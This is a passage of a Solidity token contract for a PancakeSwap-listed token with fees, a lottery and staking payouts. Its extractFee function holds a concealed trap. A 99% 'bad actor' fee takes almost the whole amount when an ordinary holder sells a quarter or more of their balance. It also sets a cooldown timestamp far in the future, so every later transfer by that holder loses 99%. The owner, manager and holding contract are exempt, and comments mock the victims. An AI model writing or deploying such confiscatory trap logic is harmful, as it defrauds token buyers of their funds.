    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) public userAddr;
    mapping(address => bool) public isLPPool;
    mapping(address => bool) public isExempt;
    mapping(address => bool) public isFeeExempt;

    address public manager;
    //address[] private players; // MAINNET
    address[] public players; // TESTNET

    uint256 public liquidityFee = 1;
    uint256 public operationsFee = 1;
    uint256 public totalFee = 2;

    uint256 public badActorFee = 99;

    uint256 public _sellcoolDown = 1800;
    mapping (address => uint256) _lastSell;

    address public autoLiquidityReceiver;
    address public operationsFeeReceiver;
    address public holdingContract;

    PancakeSwapRouter public router;
    address public pair;

    uint256 public launchedAt;
    bool public tradingOpen = true;

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    constructor() Ownership(msg.sender) {
        router = PancakeSwapRouter(pancakeAddress);
        pair = PancakeSwapFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = uint256(_tradingSupply + _reserveSupply);

        manager = msg.sender;
        isLPPool[pair] = true;

        isExempt[manager] = true;
        isExempt[owner] = true;
        isExempt[address(this)] = true;
        isExempt[DEAD] = true;
        isExempt[ZERO] = true;
        isExempt[pair] = true;
        isExempt[pancakeAddress] = true;
        isExempt[holdingContract] = true;

        isFeeExempt[owner] = true;
        isFeeExempt[manager] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[ZERO] = true;
        isFeeExempt[holdingContract] = true;

        autoLiquidityReceiver = address(this);
        operationsFeeReceiver = address(this);
        holdingContract = holdingContractAddress;

        totalFee = liquidityFee + operationsFee;

        _balances[address(this)] = _tradingSupply;
        _balances[holdingContract] = _reserveSupply;

        emit Transfer(address(0), address(this), _tradingSupply);
        emit Transfer(address(0), holdingContract, _reserveSupply);
    }

    receive() external payable {
        address sender = msg.sender;
            if (!isExempt[sender]) {
                revert("NOT AUTHORIZED.");
            }
    }

    function name() external pure override returns (string memory) {return _name;}
    function symbol() external pure override returns (string memory) {return _symbol;}
    function decimals() external pure override returns (uint8) {return _decimals;}
    function totalSupply() external view override returns (uint256) {return _totalSupply;}
    function getOwner() external view override returns (address) {return owner;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}
    function getCirculatingSupply() public view returns (uint256) {
        return (_tradingSupply + _reserveSupply) - (balanceOf(DEAD) + balanceOf(ZERO) + balanceOf(holdingContract));
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(_totalSupply));
    }
    function launched() private view returns (bool) {
        return launchedAt != 0;
    }
    function checkTxLimit(address sender, uint256 amount) private view {
        require(amount <= _maxTxAmount || isExempt[sender], "TX Limit Exceeded");
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != uint256(_totalSupply)) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }
    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        if (sender == address(this)) {return _basicTransfer(sender, recipient, amount);
        } else if (isExempt[sender] && isExempt[recipient]) {return _basicTransfer(sender, recipient, amount);
        } else if (!isExempt[sender] && recipient == holdingContract) {return _basicTransfer(sender, recipient, amount);
        } else if (sender == DEAD) {revert("THIS OPERATION IS NOT ALLOWED");
        } else if (sender == ZERO) {revert("THIS OPERATION IS NOT ALLOWED");
        } else if (!launched() && !isExempt[sender]) {revert("TRADING NOT OPEN");
        } else if (!launched() && !isExempt[recipient]) {revert("TRADING NOT OPEN");
        } else if (!isExempt[sender] && recipient == DEAD) {revert("YOU ARE NOT AUTHORIZED FOR THIS ACTION");
        } else if (!isExempt[sender] && recipient == ZERO) {revert("YOU ARE NOT AUTHORIZED FOR THIS ACTION");
        } else
            checkTxLimit(sender, amount);
            _balances[sender] = _balances[sender] - amount;
            if (!isExempt[recipient]) {require((_balances[recipient] + amount) <= _walletMax, "Max wallet violated!");}
            uint256 finalAmount = extractFee(sender, recipient, amount);
            _balances[recipient] = _balances[recipient] + finalAmount;
            autoEnterLottery(sender, recipient);
            HoldingContractInterface(holdingContract).payStakingDividend();
            emit Transfer(sender, recipient, finalAmount);
            return true;
    }

    function extractFee(address sender, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = (amount * totalFee) / 100;
        uint256 BAF = (amount * badActorFee) / 100;
        if (isFeeExempt[sender] || isFeeExempt[recipient]) {
            uint256 zeroFee = 0;
            _balances[address(this)] = _balances[address(this)] + zeroFee;
            emit Transfer(sender, address(this), zeroFee);
            return amount - zeroFee;
        } else if (_lastSell[sender] >= block.timestamp) { // Thanks for Playing, next time don't sell for a 2x.
            _lastSell[sender] = (block.timestamp * 10) + _sellcoolDown;
            _balances[address(this)] = _balances[address(this)] + BAF;
            emit Transfer(sender, address(this), BAF);
            return amount - BAF;
        } else if (isLPPool[recipient] && amount >= (_balances[sender] * 25) / 100) { // You just couldn't help yourself, could you?
            _lastSell[sender] = (block.timestamp * 2) + _sellcoolDown;
            _balances[address(this)] = _balances[address(this)] + BAF;
            emit Transfer(sender, address(this), BAF);
            return amount - BAF;
        } else
            _balances[address(this)] = _balances[address(this)] + feeAmount;
            emit Transfer(sender, address(this), feeAmount);
            return amount - feeAmount;
    }
